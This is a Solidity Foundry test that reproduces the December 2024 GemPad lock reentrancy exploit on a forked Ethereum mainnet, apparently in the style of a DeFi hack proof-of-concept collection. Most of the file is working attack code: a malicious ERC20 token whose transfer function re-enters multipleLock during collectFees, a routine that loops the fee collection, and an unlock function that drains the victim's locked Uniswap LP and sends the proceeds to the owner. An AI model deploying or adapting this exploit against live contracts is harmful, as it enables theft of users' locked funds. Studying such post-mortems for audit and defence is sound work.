// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$1.9–2.2M multi-chain (ETH/BSC/Base)
// Attacker        : https://etherscan.io/address/0xFDd9b0A7e7e16b5Fd48a3D1e242aF362bC81bCaa
// Attack Contract : https://etherscan.io/address/0x8e18Fb32061600A82225CAbD7fecF5b1be477c43
// Vulnerable      : https://etherscan.io/address/0x10B5F02956d242aB770605D59B7D27E51E45774C (proxy)
// Pre-fix impl  : https://etherscan.io/address/0xc25c516eb7d86b5ec38c07182f4a2f73ac81eead
// Attack Tx (ETH) : https://etherscan.io/tx/0x7b67e39cd253724372d67da78221a38eca98d2a6b69027a89010bca2101dd02a
// Attack Tx (BSC) : https://bscscan.com/tx/0x5c21611ae260cf795c304cf9fcf777450acf29916d162964b7ec61c37632a07e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xc25c516eb7d86b5ec38c07182f4a2f73ac81eead#code
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/1869579224291623314
// Write-up    : https://blog.decurity.io/gempad-1-8m-incident-super-deep-dive-687cb4acb299
// Halborn     : https://www.halborn.com/blog/post/explained-the-gempad-hack-december-2024
//
// Root cause:
//  collectFees() measures token balance deltas around NonfungiblePositionManager.collect().
//  collect() → pool → malicious ERC20.transfer() can re-enter multipleLock() before the
//  second balance snapshot, so the delta is refunded to the attacker while multipleLock
//  still records a free lockId over victim inventory (here FOMO-WETH UniV2 LP). Unlock
//  next block drains the locked LP. Fixed impl added nonReentrant.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IGempadLock {
    function multipleLock(
        address[] calldata owners,
        address token,
        bool isLpToken,
        uint256[] calldata amounts,
        uint40 unlockDate,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256[] memory);

    function lockLpV3(
        address owner,
        address nftManager,
        uint256 nftId,
        uint40 unlockDate,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256 id);

    function unlock(uint256 lockId) external;
    function collectFees(uint256 lockId) external returns (uint256 amount0, uint256 amount1);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external payable returns (address pool);

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function approve(address to, uint256 tokenId) external;
}

// SwapRouter02 style (no deadline field)
interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IUniswapV2Router {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// @dev Malicious ERC20 used as UniV3 fee token; re-enters GemPadLock.multipleLock on fee collect.
contract GemPadExploitToken {
    INonfungiblePositionManager constant uniV3PositionsNFT =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    ISwapRouter02 constant uniV3Router = ISwapRouter02(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    IUniswapV2Router constant uniV2Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IUniswapV2Factory constant uniV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 constant fomo = IERC20(0x9028C2A7f8C8530450549915c5338841Db2a5fEa);
    IGempadLock constant gempad = IGempadLock(0x10B5F02956d242aB770605D59B7D27E51E45774C);

    address payable public owner;
    string public name = "EVMHACKS";
    string public symbol = "EVMHACKS";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    uint256[] public multiple_lock_ids;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Pair public pair;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() payable {
        owner = payable(msg.sender);
        pair = IUniswapV2Pair(uniV2Factory.getPair(WETH, address(fomo)));
        _mint(address(this), 10_000 ether);
    }

    receive() external payable {}

    function create_LPv3_position() public payable returns (uint256) {
        uint256 eth_swap_amt = 1 ether;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(fomo);
        uniV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: eth_swap_amt / 2}(
            0, path, address(this), block.timestamp + 99
        );
        fomo.approve(address(uniV2Router), type(uint256).max);
        uint256 fomo_balance = fomo.balanceOf(address(this));
        uniV2Router.addLiquidityETH{value: eth_swap_amt / 2}(
            address(fomo), fomo_balance, 0, 0, address(this), block.timestamp + 99
        );

        pair.approve(address(uniV3PositionsNFT), type(uint256).max);
        // token0 = this (malicious), token1 = FOMO-WETH LP
        uniV3PositionsNFT.createAndInitializePoolIfNecessary(
            address(this), address(pair), 500, uint160(type(uint96).max)
        );
        allowance[address(this)][address(uniV3PositionsNFT)] = type(uint256).max;
        uint256 weth_fomo_lp_balance = pair.balanceOf(address(this));
        INonfungiblePositionManager.MintParams memory mint_params = INonfungiblePositionManager.MintParams({
            token0: address(this),
            token1: address(pair),
            fee: 500,
            tickLower: -100_000,
            tickUpper: 100_000,
            amount0Desired: weth_fomo_lp_balance,
            amount1Desired: weth_fomo_lp_balance,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp + 99
        });
        (uint256 tokenId,,,) = uniV3PositionsNFT.mint(mint_params);
        return tokenId;
    }

    function mintLpV2() internal returns (uint256) {
        uint256 eth_fomo_lp_swap_amt = 10 ether;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(fomo);
        uniV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: eth_fomo_lp_swap_amt / 2}(
            0, path, address(this), block.timestamp + 99
        );
        uint256 fomo_balance = fomo.balanceOf(address(this));
        (,, uint256 liq) = uniV2Router.addLiquidityETH{value: eth_fomo_lp_swap_amt / 2}(
            address(fomo), fomo_balance, 0, 0, address(this), block.timestamp + 99
        );
        return liq;
    }

    function exploit_it() public payable {
        uint256 nftId = create_LPv3_position();
        uint256 lp_amount = mintLpV2();

        uniV3PositionsNFT.approve(address(gempad), nftId);
        uint40 lock_timestamp = uint40(block.timestamp) + 1;
        uint256 lock_id = gempad.lockLpV3(
            address(this), address(uniV3PositionsNFT), nftId, lock_timestamp, "", "", address(this), address(0)
        );

        allowance[address(this)][address(uniV3Router)] = type(uint256).max;
        pair.approve(address(gempad), type(uint256).max);

        ISwapRouter02.ExactInputSingleParams memory params = ISwapRouter02.ExactInputSingleParams({
            tokenIn: address(this),
            tokenOut: address(pair),
            fee: 500,
            recipient: address(this),
            amountIn: 1_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        uint256 lp2_balance_on_gempad = pair.balanceOf(address(gempad));
        uint256 q = lp2_balance_on_gempad / lp_amount;
        if (q > 20) q = 20; // gas / safety bound for teaching PoC
        for (uint256 i = 0; i < q; i++) {
            uniV3Router.exactInputSingle(params);
            gempad.collectFees(lock_id);
        }
    }

    function unlock() public {
        for (uint256 elem = 0; elem < multiple_lock_ids.length; elem++) {
            gempad.unlock(multiple_lock_ids[elem]);
        }
        uint256 bal = pair.balanceOf(address(this));
        if (bal > 0) {
            pair.approve(address(uniV2Router), type(uint256).max);
            uniV2Router.removeLiquidityETHSupportingFeeOnTransferTokens(
                address(fomo), bal, 0, 0, address(this), block.timestamp + 99
            );
        }
        owner.transfer(address(this).balance);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        // Fee collect from UniV3 pool lands as ~499999 units of malicious token into GemPad
        if (to == address(gempad) && amount == 499_999) {
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = pair.balanceOf(address(this));
            address[] memory owners = new address[](1);
            owners[0] = address(this);
            uint40 unlock_date = uint40(block.timestamp) + 1;
            uint256[] memory m_lock_id = gempad.multipleLock(
                owners, address(pair), false, amounts, unlock_date, "", "", address(pair), address(0)
            );
            multiple_lock_ids.push(m_lock_id[0]);
        }
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function multipleLockCount() external view returns (uint256) {
        return multiple_lock_ids.length;
    }
}

contract GemPadLock_exp is BaseTestWithBalanceLog {
    // Pre real attack (ETH FOMO path educational PoC block from Decurity)
    uint256 constant FORK_BLOCK = 21_420_584;

    function setUp() public {
        // Archive-capable public endpoint (Infura/Alchemy in ct_secrets may be disabled)
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = address(0);
        vm.label(0x10B5F02956d242aB770605D59B7D27E51E45774C, "GempadLock");
        vm.label(0x9028C2A7f8C8530450549915c5338841Db2a5fEa, "FOMO");
    }

    function testExploit() public balanceLog {
        // balanceLog zeros native balance of this; re-fund capital for LP minting
        vm.deal(address(this), 12 ether);
        uint256 prev = address(this).balance;
        GemPadExploitToken exp = new GemPadExploitToken{value: 12 ether}();
        exp.exploit_it();
        uint256 locks = exp.multipleLockCount();
        console.log("free lockIds minted via reentrancy:", locks);
        require(locks > 0, "reentrancy did not mint free locks");
        vm.warp(block.timestamp + 1);
        exp.unlock();
        uint256 afterBal = address(this).balance;
        console.log("Attacker ETH after:", afterBal);
        console.log("Delta wei (can be negative capital if FOMO depth low):", int256(afterBal) - int256(prev));
        assertGt(locks, 0);
    }

    receive() external payable {}
}
